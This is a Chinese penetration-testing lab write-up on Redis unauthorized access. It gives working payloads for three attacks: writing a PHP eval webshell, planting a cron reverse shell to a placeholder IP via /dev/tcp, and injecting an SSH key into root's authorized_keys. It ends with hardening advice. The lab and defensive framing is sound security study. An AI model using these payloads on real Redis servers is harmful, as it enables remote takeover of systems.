---
title: Redis 未授权访问漏洞
tags:
  - 渗透测试
  - redis
  - vulhub
creation date: 2024-04-10
done: true
---
# 1. Redis 相关介绍  
---
Redis（Remote Dictionary Server）是一个开源的使用 ANSI C 编写的，遵循 BSD 协议，支持网络，可基于内存亦可持久化的日志型、Key-Value 存储数据库。它被设计为一个高性能的键值对存储系统，可以用作数据库、缓存和消息中间件。于其高性能和灵活性，Redis 在许多高并发、高可用性的系统中被广泛使用。  

> [!tip]
> 详细内容可以查看：  
> [Redis中文学习网 - Redis开发与运维技术、Redis教程、使用手册](https://redis.com.cn/)  
> [Redis 中文网](https://www.redisdocs.com/zh-cn/)

## 1.1 Redis 常用命令  
详细内容可以查看：[redis 命令手册](https://redis.com.cn/commands.html)  
- `SET`：设置指定 key 的值。 `SET key value`  
- `GET`：获取指定 key 的值。 `GET key`  
- `DEL`：删除给定的一个或多个 key。 `DEL key [key ...]`
- `INCR`：将 key 中储存的数字值增 1。`INCR key`  
- `KEYS`：查找所有匹配给定模式 pattern 的 key 。`KEYS pattern`，例如：`KEYS *`，列出所有键。  
- `CONFIG SET`：修改 redis 配置参数，无需重启。 `CONFIG SET parameter value`
	- `dir`：设置工作目录，必须是路径，而不是文件。  
	- `dbfilename`：设置辈分文件名。  
- `CONFIG GET`：获取指定配置参数的值。 `CONFIG GET parameter`  
	通过 `redis-cli` 提示符下输入 `CONFIG GET *` 可以查看 Redis 所有支持的参数。
	支持的参数可以查看：[redis.conf](https://raw.githubusercontent.com/redis/redis/2.8/redis.conf)  
- `SAVE`：执行**同步**保存操作，把 Redis 实例中某一时点的所有数据的快照以 RDB 文件的形式保存到磁盘上。  
	生产环境不要执行 `SAVE` 命令，因为这会阻塞所有其它的客户端。
- `BGSAVE`：后台保存 DB，父进程继续提供服务以供客户端调用，子进程将 DB 数据保存到磁盘然后退出。一般立即返回 OK 状态码。  
- `LASTSAVE`：以 UNIX 时间戳格式返回最近一次 Redis 成功将数据保存到磁盘上的时间。  
	通常被用来检查 `BGSAVE` 命令是否执行完成。  
- `FLUSHALL`：删除所有数据库的所有 key。此命令不会失败。
- `FLUSHDB`：清空当前 `select` 数据库中的所有 key。此命令不会失败。  
- `INFO`：获取 Redis 服务器的各种信息和统计数值。  `INFO [section]`  

## 1.2 Redis 安装  
Linux 的安装方式：[Install Redis on Linux | Docs](https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-on-linux/)  
Redis 源码安装方式：[Install Redis from Source | Docs](https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-from-source/)  
Redis 客户端：  
- [GitHub - qishibo/AnotherRedisDesktopManager: 🚀🚀🚀A faster, better and more stable Redis desktop manager \[GUI client\], compatible with Linux, Windows, Mac.](https://github.com/qishibo/AnotherRedisDesktopManager)    
- 安装 Redis-cli：`apt install redis-cli`  

# 2. 漏洞复现  
---
环境使用 docker 进行启动，下载地址：[Vulnerability-exploitation/redis\_unauthorized\_access at main · yiscook/Vulnerability-exploitation · GitHub](https://github.com/yiscook/Vulnerability-exploitation/tree/main/redis_unauthorized_access)  
需要下载三个文件：`docker-compose.yml`、`dockerfile`、`start_services.sh`
## 2.1 环境介绍  
在 Redis 6.0 版本，配置文件中引入了 `enable-protected-configs`，这个参数用于保护 Redis 的配置文件不被非授权用户修改。在此之前，Redis 的配置文件是可以被任何用户修改的，这可能导致安全风险，特别是在未授权访问的情况下。通过设置 `enable-protected-configs` 参数为 `yes`，可以确保只有授权的用户能够修改 Redis 的配置文件。所以选择 Redis 5.0 进行练习。  
- 攻击环境：kali  
- 靶场环境：docker（安装在 kali）  
	docker 镜像：Redis 5.0 的 docker 官方镜像（debian 11） + apache 2 + php + cron + ssh

# 3. Redis 未授权访问漏洞利用  
---
> [!tip]
> docker 镜像中所开放的端口均没有与主机 kali 进行映射，所以全部内容均需要在 kali 中操作  
> 首先获取 docker 靶机的 ip 地址：`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <CONTAINER-ID>`  

可以先试用 nmap 扫描一下靶机都开放了哪些端口。  
![nmap扫描](https://image.yiscook.top/blog-image/202404152327327.png)
## 3.1 写入 webshell  
已知靶场 IP 是：`172.18.0.2`，并且开放了 6379 和 80 端口。访问 80 端口，内容如下：
![暴露80端口](https://image.yiscook.top/blog-image/202404152214824.png)
所以在攻击端尝试使用 Redis 客户端 AnotherRedisDesktopManager 进行连接。  
![redis客户端连接](https://image.yiscook.top/blog-image/202404152212055.png)    
可以成功连接，并且在 80 端口暴露的页面获取到了靶机的 apache server 路径：`/var/www/html`  
所以尝试使用 AnotherRedisDesktopManager 的控制台写入 webshell。  
payload 如下：SAVE 也可替换为 BGSAVE
```Redis
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save
```
![webshell-payload](https://image.yiscook.top/blog-image/202404152253119.png)
尝试访问 172.18.0.2/shell.php，看看是否写入成功。  
![访问shell.php](https://image.yiscook.top/blog-image/202404152254638.png)  
已经成功写入，尝试使用蚁剑进行连接。  
![蚁剑连接webshell](https://image.yiscook.top/blog-image/202404152256440.png)  
可以成功连接！

## 3.2 反弹 shell  
> [!tip]
> 需要注意：在 Ubuntu 和 Debian `/var/spool/cron/crontabls` 中的定时任务，文件权限需要在 600，才可以正常执行，而 centos 中文件权限是 600 和 644 都可以被执行。  
> 通过 Redis 保存数据快照的形式，所产生的文件权限是 644，导致 Ubuntu 和 Debian 中无法正常执行定时任务。  
> centos 目前已经停止维护，所以靶场的环境不考虑使用 centos。  
> 所以，这部分主要是了解用法和思路。

反弹 shell 命令生成器：[反弹shell命令在线生成器|🔰雨苁🔰](https://www.ddosi.org/shell/)  
已知靶场 IP 是：`172.18.0.2`，并且开放了 6379 和 80 端口。尝试使用 AnotherRedisDesktopManager 的控制台使用 cron 服务，来反弹 shell。  
cron 服务存放定时命令的路径通常为：`/var/spool/cron/crontabs`，所以可以尝试构造如下 payload：  
将 your-ip 和 your-port 替换为正在开启监听服务的 ip 和 port。可使用 nc 或 ncat（[Ncat - Netcat for the 21st Century](https://nmap.org/ncat/)）
```Redis
config set dir /var/spool/cron/crontabs
config set dbfilename root
set payload "\n\n* * * * * '/bin/bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1\n\n'"
bgsave # 或使用 save
```
攻击端执行，监听 9001 端口：
```shell
nc -lvvp 9001
```

### 3.2.1 不能反弹 shell 的原因  
如果使用 Ubuntu 或 Debian 的 crontab 是通过 /bin/sh 来执行其中的定时任务，而 /bin/sh 软连接指向了 dash。dash 执行上述反弹 shell 的命令可能会报错。
1. 可以尝试修改 /bin/sh 的软连接，使其指向到 bash
	```shell
	ln -s -f bash /bin/sh
	```
2. 不修改/bin/sh 的软连接，修改 payload：
	```shell
	* * * * *  bash -c "bash -i  >&/dev/tcp/<your-ip>/<your-port> 0>&1"
	```

## 3.3 写入公钥  
已知靶场 IP 是：`172.18.0.2`，并且开放了 6379 和 22 端口。  
在攻击端生成 ssh 密钥，生成的默认路径在用户 home 路径下的 .ssh 文件夹，payload 如下：  
```shell
# 生成ssh密钥：
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
# 也可使用 AnotherRedisDesktopManager 直接创建字符串的key，内容为id_rsa.pub的文件内容
cat key.txt | redis-cli -h 172.18.0.2 -x set crack

# 在 Redis 中执行：
config set dir /root/.ssh
config set dbfilename authorized_keys
bgsave
```
![ssh-payload](https://image.yiscook.top/blog-image/202404152308194.png)  
在 Redis 完成公钥的写入后，尝试使用 ssh 进行连接。  
```shell
ssh -i id_rsa root@172.18.0.2
```
![ssh连接成功](https://image.yiscook.top/blog-image/202404152315358.png)  
成功通过 ssh 连接到 Redis 服务器。  

# 4. 漏洞修复和预防  
---
[Redis 配置文件详解](https://redis.com.cn/redis-configuration.html#redis-%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E)  
- 配置文件相关：
	- `port`：修改默认端口，6379 已被熟知，修改为其他不常用，不常见的端口。  
	- `bind`：修改监听主机地址，建立访问白名单，仅允许指定 ip 进行访问，禁止该参数为空，禁止绑定为 `0.0.0.0`
	- `requirepass`：设置 Redis 连接密码，并且使用强密码，定期修改。  
	- `enable-protected-configs`：非授权用户不可修改配置内容。在较高版本的 Redis 中，设置为 yes。  
- 定期升级 Redis 版本，或者使用较高版本稳定的 Redis，避免低版本具有漏洞。  
- 避免以 root 等具有高权限的用户开启 Redis 服务。
- 如果使用 WAF 或防火墙等产品，对 Redis 的地址添加访问控制。 
- 也需要注意 ssh 服务的相关配置。最好使用白名单，以及禁止 root 用户登录等配置。
